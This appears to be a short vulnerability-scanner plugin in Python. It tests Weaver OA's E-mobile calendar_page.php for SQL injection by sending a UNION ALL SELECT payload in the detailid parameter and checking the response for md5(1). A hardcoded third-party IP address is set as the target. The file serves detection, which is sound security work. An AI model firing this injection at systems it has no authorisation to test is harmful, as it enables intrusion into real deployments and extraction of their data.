#!/usr/bin/env python
# -*- coding: utf-8 -*-
#ref: http://wooyun.org/bugs/wooyun-2015-0127270

def assign(service, arg):
    if service == "weaver_oa":
        return True, arg
        
def audit(arg):
    payload = 'E-mobile/calendar_page.php?detailid=-5272%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,md5(1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if (code == 500 or code == 200) and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://219.232.254.131:8082/')[1])